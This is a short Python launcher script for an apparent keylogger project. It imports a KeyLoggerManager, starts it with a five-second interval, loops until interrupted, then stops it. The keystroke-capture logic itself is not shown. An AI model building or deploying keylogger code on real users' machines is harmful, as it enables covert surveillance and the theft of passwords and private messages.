from keylogger.keylogger_manager.manager import KeyLoggerManager

def main():

    manager = KeyLoggerManager(interval=5)
    
    manager.start()
    
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Stopping keylogger...")
        manager.stop()


if __name__ == "__main__":
    main()
